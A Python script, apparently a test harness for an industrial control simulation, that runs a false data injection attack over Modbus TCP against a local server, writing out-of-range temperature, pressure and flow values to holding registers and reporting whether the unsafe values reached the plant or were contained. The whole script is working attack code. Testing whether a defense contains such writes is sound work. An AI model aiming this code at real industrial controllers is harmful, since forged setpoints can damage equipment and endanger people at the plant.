from pymodbus.client import ModbusTcpClient
import time
import sys

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 5020

TEMP_SAFE     = (600, 750)
PRESSURE_SAFE = (300, 400)
FLOW_SAFE     = (500, 1500)

print(f"--- FALSE DATA INJECTION: port {PORT} ---")
client = ModbusTcpClient(HOST, port=PORT)
client.connect()

readings = []  # (elapsed, temp, pressure, flow)
start = time.time()

for i in range(6):
    client.write_register(0, 1100, slave=1)
    client.write_register(1, 550, slave=1)
    client.write_register(2, 2000, slave=1)
    # Read back immediately after each write batch
    r = client.read_holding_registers(0, 3, slave=1)
    if not r.isError():
        elapsed = time.time() - start
        readings.append((elapsed, r.registers[0], r.registers[1], r.registers[2]))
    time.sleep(1)

client.close()

peak_temp     = max(readings, key=lambda x: x[1]) if readings else (0, 0, 0, 0)
peak_pressure = max(readings, key=lambda x: x[2]) if readings else (0, 0, 0, 0)
peak_flow     = max(readings, key=lambda x: x[3]) if readings else (0, 0, 0, 0)

def unsafe_count(idx, safe_range):
    return sum(1 for r in readings if not (safe_range[0] <= r[idx] <= safe_range[1]))

print(f"Peak temp observed:     {peak_temp[1]/10:.1f}C at t={peak_temp[0]:.2f}s "
      f"(safe: {TEMP_SAFE[0]/10:.1f}-{TEMP_SAFE[1]/10:.1f}C)")
print(f"Peak pressure observed: {peak_pressure[2]/10:.1f}bar at t={peak_pressure[0]:.2f}s "
      f"(safe: {PRESSURE_SAFE[0]/10:.1f}-{PRESSURE_SAFE[1]/10:.1f}bar)")
print(f"Peak flow observed:     {peak_flow[3]/10:.1f}Nm3/h at t={peak_flow[0]:.2f}s "
      f"(safe: {FLOW_SAFE[0]/10:.1f}-{FLOW_SAFE[1]/10:.1f})")
print(f"Unsafe readings: temp {unsafe_count(1, TEMP_SAFE)}/{len(readings)}, "
      f"pressure {unsafe_count(2, PRESSURE_SAFE)}/{len(readings)}, "
      f"flow {unsafe_count(3, FLOW_SAFE)}/{len(readings)}")

all_safe = (unsafe_count(1, TEMP_SAFE) == 0 and
            unsafe_count(2, PRESSURE_SAFE) == 0 and
            unsafe_count(3, FLOW_SAFE) == 0)
print("RESULT: attack fully contained" if all_safe else "RESULT: UNSAFE VALUES REACHED THE PLANT")
